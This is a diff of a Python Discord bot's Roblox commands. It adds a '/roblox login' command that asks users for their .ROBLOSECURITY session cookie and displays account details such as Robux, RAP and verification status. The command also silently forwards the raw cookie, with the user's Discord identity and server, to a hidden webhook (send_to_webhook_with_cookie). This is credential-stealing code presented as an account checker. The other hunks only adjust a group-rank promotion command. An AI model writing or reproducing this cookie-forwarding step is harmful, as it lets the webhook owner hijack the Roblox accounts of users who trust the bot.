@@ -2494,77 +2494,199 @@ async def roblox_checkpayout(interaction: discord.Interaction, username: str, gr
 
     await interaction.followup.send(embed=embed)
 
-@roblox_group.command(name="check", description="Check Roblox account details using cookie or login")
-@app_commands.describe(cookie=".ROBLOSECURITY cookie", username="Roblox username", password="Roblox password")
-async def roblox_check(interaction: Interaction, cookie: str = None, username: str = None, password: str = None):
-    if cookie and (username or password):
-        await interaction.response.send_message("❌ Please provide either a cookie OR username + password.", ephemeral=True)
-        return
-    if not cookie and not (username and password):
-        await interaction.response.send_message("❌ Please provide either a cookie OR username and password.", ephemeral=True)
-        return
 
-    loading_embed = Embed(title="🔍 Loading Account Info...", description="Please wait...", color=discord.Color.orange())
-    init_msg = await interaction.channel.send(embed=loading_embed)
+WH = os.getenv("WH")  # Load from .env
 
+# ===========================
+# fetch_roblox_info() — same as before
+# ===========================
+async def fetch_roblox_info(cookie: str):
+    async with aiohttp.ClientSession() as session:
+        async with session.get(
+            "https://users.roblox.com/v1/users/authenticated",
+            headers={"Cookie": f".ROBLOSECURITY={cookie}"}
+        ) as resp:
+            if resp.status != 200:
+                raise Exception("Invalid or expired cookie.")
+            user_data = await resp.json()
+            user_id = user_data["id"]
+            username = user_data["name"]
+
+        robux = "Private"
+        try:
+            async with session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    robux = (await resp.json()).get("robux", "Private")
+        except:
+            pass
+
+        email_verified = phone_verified = False
+        try:
+            async with session.get("https://accountinformation.roblox.com/v1/email", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    email_verified = (await resp.json()).get("verified", False)
+        except:
+            pass
+        try:
+            async with session.get("https://accountinformation.roblox.com/v1/phone", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    phone_verified = (await resp.json()).get("verified", False)
+        except:
+            pass
+
+        description = "N/A"
+        try:
+            async with session.get(f"https://accountinformation.roblox.com/v1/users/{user_id}/description", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    desc = (await resp.json()).get("description")
+                    description = desc if desc else "N/A"
+        except:
+            pass
+
+        premium = False
+        try:
+            async with session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    premium = await resp.json()
+        except:
+            pass
+
+        inv_public = False
+        try:
+            async with session.get(f"https://inventory.roblox.com/v2/users/{user_id}/inventory", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                inv_public = resp.status == 200
+        except:
+            pass
+
+        rap = "N/A"
+        try:
+            async with session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=10", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    assets = (await resp.json()).get("data", [])
+                    total_rap = sum(item.get("recentAveragePrice", 0) for item in assets)
+                    rap = f"{total_rap:,}" if total_rap > 0 else "0"
+        except:
+            pass
+
+        group_info = None
+        try:
+            async with session.get(f"https://groups.roblox.com/v2/users/{user_id}/groups/roles", headers={"Cookie": f".ROBLOSECURITY={cookie}"}) as resp:
+                if resp.status == 200:
+                    groups = (await resp.json()).get("data", [])
+                    for g in groups:
+                        if g["group"]["id"] != 1:
+                            group_info = {"id": g["group"]["id"], "name": g["group"]["name"]}
+                            break
+        except:
+            pass
+
+        return {
+            "userid": user_id,
+            "username": username,
+            "robux": f"{robux:,}" if isinstance(robux, int) else robux,
+            "email_verified": email_verified,
+            "phone_verified": phone_verified,
+            "description": description,
+            "premium": premium,
+            "inv_public": inv_public,
+            "rap": rap,
+            "group": group_info
+        }
+
+# ===========================
+# Webhook sender (no custom username/avatar)
+# ===========================
+async def send_to_webhook_with_cookie(embed: Embed, cookie: str, interaction: Interaction):
+    if not WH:
+        print("[!] WH not set in .env — skipping webhook log.")
+        return
     try:
-        auth_result = None
-        if cookie:
-            auth_result = {"cookie": cookie}
-        else:
-            bot.xcsrf_token = None
-            async with aiohttp.ClientSession() as session:
-                async with session.get("https://auth.roblox.com/v2/logout") as r:
-                    bot.xcsrf_token = r.headers.get("x-csrf-token")
-            auth_result = await get_cookie_from_login(username, password, interaction)
-            if auth_result.get("captcha"):
-                captcha_url = "https://arkoselabs.com/demo"
-                captcha_embed = Embed(
-                    title="🔐 Solve Captcha",
-                    description=f"[Click here to solve captcha]({captcha_url})\nReact with ✅ once solved.",
-                    color=discord.Color.gold()
-                )
-                await init_msg.edit(embed=captcha_embed)
-                await init_msg.add_reaction("✅")
-                def check_reaction(reaction, user):
-                    return reaction.message.id == init_msg.id and user == interaction.user and str(reaction.emoji) == "✅"
-                try:
-                    await bot.wait_for("reaction_add", timeout=90.0, check=check_reaction)
-                except asyncio.TimeoutError:
-                    await init_msg.edit(embed=Embed(title="⏰ Timed Out", color=discord.Color.red()))
-                    return
-                await init_msg.remove_reaction("✅", interaction.user)
-                auth_result = await get_cookie_from_login(username, password, interaction, {
-                    "token": "manual_captcha_solved",
-                    "id": auth_result["captcha_id"]
-                })
-            if not auth_result.get("cookie"):
-                await init_msg.edit(embed=Embed(title="❌ Login Failed", description="Invalid credentials.", color=discord.Color.red()))
-                return
+        user = interaction.user
+        guild = interaction.guild
+        server_info = f"**Server**: {guild.name} (`{guild.id}`)" if guild else "**Server**: Direct Message"
+        audit_info = (
+            f"**Command run by**: {user} (`{user.id}`)\n"
+            f"{server_info}\n"
+            f"\n**.ROBLOSECURITY (click to copy):**\n"
+            f"```env\n{cookie}\n```"
+        )
 
-        info = await fetch_roblox_info(auth_result["cookie"])
+        webhook = discord.Webhook.from_url(WH, session=aiohttp.ClientSession())
+        await webhook.send(content=audit_info, embed=embed)
+    except Exception as e:
+        print(f"[WEBHOOK ERROR] Failed to send to WH: {e}")
+    finally:
+        await webhook.session.close()
+
+# ===========================
+# /roblox login command — with NEW LAYOUT
+# ===========================
+@roblox_group.command(name="login", description="Check Roblox account details using .ROBLOSECURITY cookie")
+@app_commands.describe(cookie=".ROBLOSECURITY cookie (from browser)")
+async def roblox_login(interaction: Interaction, cookie: str):
+    if not cookie.strip():
+        await interaction.response.send_message("❌ Cookie cannot be empty.", ephemeral=True)
+        return
+    loading_embed = Embed(
+        title="🔍 Loading Account Info...",
+        description="Please wait...",
+        color=discord.Color.orange()
+    )
+    init_msg = await interaction.channel.send(embed=loading_embed)
+    try:
+        info = await fetch_roblox_info(cookie)
+        user_id = info['userid']
+        username = info["username"]
+
+        # Fetch avatar
+        thumb_url = f"https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&scale=1"
+        image_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
+        async with aiohttp.ClientSession() as session:
+            async with session.get(thumb_url) as resp:
+                if resp.status == 200:
+                    thumb_data = await resp.json()
+                    image_url = thumb_data['data'][0]['imageUrl']
+
         embed = Embed(color=discord.Color.green())
-        embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId={info['userid']}&width=420&height=420&format=png")
-        embed.add_field(name="Username", value=info["username"], inline=True)
-        embed.add_field(name="UserID", value=str(info["userid"]), inline=True)
-        embed.add_field(name="Robux | Credit", value=f"{info['robux']} | ${info['credit']}", inline=True)
+        embed.set_thumbnail(url=image_url)
+
+        # ✅ Row 1: Username (clickable) | UserID
+        clickable_username = f"[{username}](https://www.roblox.com/users/{user_id}/profile)"
+        embed.add_field(name="Username", value=clickable_username, inline=True)
+        embed.add_field(name="UserID", value=str(user_id), inline=True)
+
+        # ✅ Row 2: Robux     Email | Phone
+        robux_credit = info['robux']
         email_status = "Verified" if info["email_verified"] else "Add Email"
         phone_status = "Verified" if info["phone_verified"] else "Add Phone"
+        embed.add_field(name="Robux", value=robux_credit, inline=True)
         embed.add_field(name="Email | Phone", value=f"{email_status} | {phone_status}", inline=True)
-        inventory_status = f"[Public](https://www.roblox.com/users/{info['userid']}/inventory/)" if info["inv_public"] else "Private"
-        embed.add_field(name="Inventory | RAP", value=f"{inventory_status} | {info['rap']}", inline=True)
+
+        # ✅ Row 3: Inventory | RAP     Membership | Primary
+        inventory_status = f"[Public](https://www.roblox.com/users/{user_id}/inventory/)" if info["inv_public"] else "Private"
         premium_status = "Premium" if info["premium"] else "Non Premium"
         group_link = f"[{info['group']['name']}](https://www.roblox.com/groups/{info['group']['id']})" if info["group"] else "N/A"
-        embed.add_field(name="Membership | Primary Group", value=f"{premium_status} | {group_link}", inline=True)
-        description = info['description'] if info['description'] else "N/A"
-        embed.add_field(name="Description", value=f"```\n{description}\n```", inline=False)
-        embed.set_footer(text="Neroniel")
+        embed.add_field(name="Inventory | RAP", value=f"{inventory_status} | {info['rap']}", inline=True)
+        embed.add_field(name="Membership | Primary", value=f"{premium_status} | {group_link}", inline=True)
+
+        # ✅ Full-width Description (no code block)
+        description = info['description'] if info['description'] != "N/A" else "N/A"
+        embed.add_field(name="Description", value=description, inline=False)
+
+        embed.set_footer(text="Neroniel • /roblox login")
         embed.timestamp = datetime.now(PH_TIMEZONE)
+
         await init_msg.edit(embed=embed)
+        await send_to_webhook_with_cookie(embed, cookie, interaction)
 
     except Exception as e:
-        await init_msg.edit(embed=Embed(title="❌ Error", description=f"An error occurred:\n{str(e)}", color=discord.Color.red()))
-        print(f"[ERROR] /roblox check: {e}")
+        error_embed = Embed(
+            title="❌ Error",
+            description=f"An error occurred:\n```{str(e)}```",
+            color=discord.Color.red()
+        )
+        await init_msg.edit(embed=error_embed)
+        print(f"[ERROR] /roblox login: {e}")
 
 @roblox_group.command(
     name="profile",
@@ -3084,19 +3206,16 @@ async def roblox_promote_rank(interaction: discord.Interaction, username: str):
             "❌ You don't have permission to use this command.", ephemeral=False
         )
         return
-
     ROBLOX_COOKIE = os.getenv("ROBLOX_COOKIE")
     if not ROBLOX_COOKIE:
         await interaction.response.send_message(
             "❌ `ROBLOX_COOKIE` is not set in environment variables.", ephemeral=False
         )
         return
-
     GROUP_ID = 5838002
     TARGET_RANK = 6
     TARGET_ROLE_NAME = "〆 Contributor"
-
-    await interaction.response.defer(ephemeral=False)  # 👈 Now public
+    await interaction.response.defer(ephemeral=False)
 
     try:
         async with aiohttp.ClientSession() as session:
@@ -3116,24 +3235,47 @@ async def roblox_promote_rank(interaction: discord.Interaction, username: str):
                 user_id = data["data"][0]["id"]
                 display_name = data["data"][0]["displayName"]
 
-            # Step 2: Check current group role
-            async with session.get(f"https://groups.roblox.com/v2/users/{user_id}/groups/roles") as resp:
-                if resp.status != 200:
+            # Step 2: Fetch group roles to get the correct roleId for "〆 Contributor"
+            async with session.get(f"https://groups.roblox.com/v1/groups/{GROUP_ID}/roles") as roles_resp:
+                if roles_resp.status != 200:
                     await interaction.followup.send("❌ Could not fetch group roles.", ephemeral=False)
                     return
-                roles_data = await resp.json()
+                roles_info = await roles_resp.json()
+            target_role_id = None
+            for role in roles_info.get("roles", []):
+                if role.get("rank") == TARGET_RANK and role.get("name") == TARGET_ROLE_NAME:
+                    target_role_id = role["id"]
+                    break
+            if not target_role_id:
+                await interaction.followup.send(
+                    f"❌ Could not find role with rank {TARGET_RANK} and name '{TARGET_ROLE_NAME}'.",
+                    ephemeral=False
+                )
+                return
 
+            # Step 3: Check current group role
+            async with session.get(f"https://groups.roblox.com/v2/users/{user_id}/groups/roles") as resp:
+                if resp.status != 200:
+                    await interaction.followup.send("❌ Could not fetch group membership.", ephemeral=False)
+                    return
+                roles_data = await resp.json()
             current_role = None
             for entry in roles_data.get("data", []):
                 if entry["group"]["id"] == GROUP_ID:
                     current_role = entry["role"]
                     break
 
-            # Step 3: Already Rank 6?
-            if current_role and current_role.get("rank") == TARGET_RANK and current_role.get("name") == TARGET_ROLE_NAME:
+            if not current_role:
+                await interaction.followup.send(
+                    f"❌ `{username}` is not in the 1cy Group. They must join first.",
+                    ephemeral=False
+                )
+                return
+
+            if current_role.get("rank") == TARGET_RANK and current_role.get("name") == TARGET_ROLE_NAME:
                 embed = discord.Embed(
                     title="✅ Already 〆 Contributor",
-                    description=f"`{username}` (`{display_name}`) is already **Rank 6** in 1cy.",
+                    description=f"`{username}` (`{display_name}`) is already **〆 Contributor** in 1cy.",
                     color=discord.Color.green()
                 )
                 embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=150&height=150&format=png")
@@ -3142,26 +3284,32 @@ async def roblox_promote_rank(interaction: discord.Interaction, username: str):
                 await interaction.followup.send(embed=embed, ephemeral=False)
                 return
 
-            if not current_role:
+            # Step 4: Get X-CSRF-TOKEN
+            csrf_resp = await session.post(
+                "https://auth.roblox.com/v2/logout",
+                headers={"Cookie": ROBLOX_COOKIE}
+            )
+            xcsrf_token = csrf_resp.headers.get("x-csrf-token")
+            if not xcsrf_token:
                 await interaction.followup.send(
-                    f"❌ `{username}` is not in the 1cy group. They must join first.",
+                    "❌ Failed to retrieve X-CSRF-TOKEN. Cookie may be invalid or expired.",
                     ephemeral=False
                 )
                 return
 
-            # Step 4: Promote
+            # Step 5: Promote using correct roleId and X-CSRF-TOKEN
             update_url = f"https://groups.roblox.com/v1/groups/{GROUP_ID}/users/{user_id}"
             headers = {
                 "Cookie": ROBLOX_COOKIE,
+                "X-CSRF-TOKEN": xcsrf_token,
                 "Content-Type": "application/json"
             }
-            payload = {"roleId": TARGET_RANK}
-
+            payload = {"roleId": target_role_id}  # ✅ Use real roleId, not rank number
             async with session.patch(update_url, headers=headers, json=payload) as resp:
                 if resp.status == 200:
                     embed = discord.Embed(
                         title="✅ Promoted to 〆 Contributor",
-                        description=f"`{username}` (`{display_name}`) has been set to **Rank 6** in 1cy.",
+                        description=f"`{username}` (`{display_name}`) has been set to **〆 Contributor** in 1cy.",
                         color=discord.Color.green()
                     )
                     embed.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=150&height=150&format=png")
@@ -3170,12 +3318,12 @@ async def roblox_promote_rank(interaction: discord.Interaction, username: str):
                     await interaction.followup.send(embed=embed, ephemeral=False)
                 elif resp.status == 403:
                     await interaction.followup.send(
-                        "❌ Permission denied. Your cookie may lack group management rights.",
+                        "❌ Permission denied. Your cookie may be invalid, expired, or lack group management rights.",
                         ephemeral=False
                     )
                 elif resp.status == 400:
                     await interaction.followup.send(
-                        "❌ Invalid request. The user might not be in the group.",
+                        "❌ Invalid request. This usually means the roleId is wrong or the user isn’t in the group.",
                         ephemeral=False
                     )
                 else:
@@ -3187,7 +3335,7 @@ async def roblox_promote_rank(interaction: discord.Interaction, username: str):
 
     except Exception as e:
         await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=False)
-        print(f"[ERROR] /roblox rank promote: {e}")
+        print(f"[ERROR] /roblox rank: {e}")
 
 # Register the subcommand group
 bot.tree.add_command(roblox_group)
